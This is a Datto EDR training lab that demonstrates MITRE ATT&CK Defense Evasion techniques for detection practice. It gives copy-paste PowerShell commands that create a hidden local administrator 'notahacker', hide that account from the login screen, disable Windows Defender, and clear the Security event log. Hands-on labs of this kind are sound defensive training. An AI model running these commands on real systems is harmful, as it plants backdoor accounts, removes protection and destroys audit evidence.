---
Title: ATT&CK - Defense Evasion Phase
Description: Introduce post-compromise attack behaviors and EDR defenses
Author: Chris Gerritz, Datto
Created: 04/07/2025
Achievements:
Duration: 10
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
- Office
- Adobe Reader
External:
- attack.mitre.org
- allitshop.infocyte.com
- 
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. We will perform post-compromise behaviors that an attacker would run once they compromised a system within the network.  This system has Datto EDR installed for monitoring so we will be able to view these commands from the defender's perspective as well.

Lab 4 is a light touch on some Defense Evasion techniques (such as disabling antivirus or defensive products). These techniques are often layered on the other techniques and phases to help hide that activity. In any case, when it comes to EDR and continuous monitoring, oftentimes we can use the presence of these evasion techniques as detection or confirmation that the user performing suspicious behaviors is indeed a threat.

---

## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs: KNOWLEDGE,UNDERSTAND, APPLY, ANALYZE, EVALUATE, CREATE
- https://www.teachthought.com/critical-thinking/blooms-taxonomy-verbs-2/
-->
1. Understand the Defense Evasion phase activities an attacker might utilize
2. Demonstrate Defense Evasion skills to disable antivirus and allow us to bring down additional malware utilities without being detected
3. Understand how we can use Defense Evasion activities to identify or confirm malicious intent

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |



## Instructions

Open a new terminal using `c:\Users\Public\rat.exe` or you can use the same terminal from the previous lab. You will be copying and pasting the lab commands into this terminal session.  If you close this window, remember to re-open `c:\Users\Public\rat.exe` before running any of the labs.

w> All labs require you to be running as an administrator. 


> *While most defensive evasion will be used alongside other techniques to hide them, an explicit defense evasion phase usually will happen where the attacker will disable security tools and logging.*

### 1. Creating a new user via net.exe
*Attackers will often create users on the machine and attempt to escalate the privledges to manipulate the machine. A common technique is to use the net.exe process to silently create new users as well as escalate privleges to local administrator rights.*

[ATT&CK T1136.001-Create Account-Local Account](https://attack.mitre.org/techniques/T1136/001/)
- Copy and paste this command into the terminal:
```Powershell
Write-Host -ForegroundColor Cyan "Initiating Persistence...creating local account"
Write-Host "Creating user 'notahacker' with admin rights..."

$n = Get-Random -Minimum 100 -Maximum 1000

$cmd = @(
    "net user notahacker Password123! /add",
    "net localgroup administrators notahacker /add",
    "Start-Sleep -Milliseconds $n"
) -join "; "

powershell.exe -NoP -Command $cmd

Write-Host -ForegroundColor Green "'notahacker' added to Administrators group successfully."
```

*Verify user was created.*

```Powershell
net users
```

*If command ran correctly should return*

```
User accounts for \\[USER-WORKSTATION]
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
notahacker               [youraccount]                 WDAGUtilityAccount
```

### 2.Hiding the attacker from userlist - Defense Evasion
*Attackers will also make attempts to conceal the account, the command below, will alter the registry keys to remove the user from the userlist screen on a login screen*

- [ATT&CK T1564.002-Hide user from userlist](https://attack.mitre.org/techniques/T1564/002/)
- Copy and paste this command into the terminal:
```Powershell
$n = Get-Random -Minimum 100 -Maximum 1000
$cmd = "reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /t REG_DWORD /f /d 0 /v 'notahacker'; Start-Sleep -Milliseconds $n"
powershell.exe -NoP -Command "$cmd"
Write-Host -ForegroundColor Green "'notahacker' removed from userlist."
```

### 3.Use Powershell to perform a **Disable Security Tools** technique
*The method we'll demonstrate today is to disable Windows Defender, often an attacker will use a script to detect and disable whatever AV is on the system. This action requires administrator privileges. This command may not work directly if tamper protection is enabled but there are methods an attacker can use to bypass tamper protection as well.*

- [ATT&CK T1089 - Defense Evasion - Disabling Security Tools](https://attack.mitre.org/techniques/T1089)
- Copy and paste this command into the terminal:
```PowerShell
Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
Write-Host "Disabling Defender..."
$cmd = @"
Set-MpPreference -DisableRealtimeMonitoring $true
Start-Sleep -Milliseconds $n
"@
powershell.exe -nop -command $cmd
```

### 4. Disabling Security Tools - Service Control Manager
> *If the above method does not work, attackers can also disable the antivirus service from the service control manager using sc.exe*

Use the Service Control Manager (sc.exe) to perform a **Disable Security Tools** technique
- [ATT&CK T1089 - Defense Evasion - Disabling Security Tools](https://attack.mitre.org/techniques/T1089)
- Copy and paste this command into the terminal:
```PowerShell
Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
Write-Host "Disabling Defender..."
$cmd = @"
sc.exe config WinDefend start= disabled
sc.exe stop WinDefend
Start-Sleep -Milliseconds $n
"@
powershell.exe -nop -command $cmd
Write-Host -ForegroundColor Red "Windows Defender Disabled"
```

### 5. Removing Evidence of Activity - wevtutil.exe clear logs
*After completing certain tasks, or as part of a script, users wil conceal their tracks in an attempt to hide their activity*

- [ATT&CK T1070.001 - Defense Evasion - Windows Event Logs Cleared](https://attack.mitre.org/techniques/T1070/001/)
- Copy and paste this command into the terminal:
```PowerShell
Write-Host -ForegroundColor Cyan "Clearing Security Logs"
$cmd = @"
wevtutil.exe cl Security
Start-Sleep -Milliseconds $n
"@
powershell.exe -nop -command $cmd
Write-Host -ForegroundColor Cyan "Logs Cleared"
```
